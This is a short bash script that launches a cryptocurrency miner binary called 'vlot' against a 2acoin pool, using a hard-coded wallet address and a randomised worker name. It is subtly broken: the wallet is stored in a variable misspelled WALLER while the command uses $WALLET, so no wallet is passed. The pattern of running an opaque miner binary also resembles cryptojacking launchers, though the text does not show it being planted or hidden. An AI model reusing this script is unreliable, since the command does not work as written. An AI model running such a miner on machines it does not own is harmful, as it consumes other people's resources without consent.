#!/bin/bash
POOL=us-central.2acoin.org:3333
WALLER=gunsE3LGfEJA533Ekmq7cFA6jxmijmYvs9bdwpMYXGQ2HG3DuPc2rFz9bSzQ6qnRibHHpXQ5yBy5UAEZAeCneJRnHFtoWSWSuBYEaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQeQemYx
WORKER=$(echo $(shuf -i 1-7 -n 1)-pul)
chmod +x vlot
./vlot --algo chukwa --pool $POOL --user $WALLET $WORKER
